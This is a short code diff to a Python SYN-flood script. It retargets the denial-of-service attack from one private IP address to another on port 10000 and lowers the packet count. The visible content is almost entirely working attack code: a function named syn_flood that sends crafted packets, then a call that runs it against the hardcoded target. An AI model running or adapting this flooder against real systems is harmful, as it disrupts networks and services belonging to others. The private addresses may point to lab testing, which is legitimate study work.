@@ -7,8 +7,8 @@ def syn_flood(target_ip, target_port, num_packets):
     send(packet, count=num_packets, verbose=1)
 
 
-target_ip = "192.168.1.82"
+target_ip = "192.168.1.66"
 target_port = 10000
-num_packets = 1000
+num_packets = 501
 
 syn_flood(target_ip, target_port, num_packets)
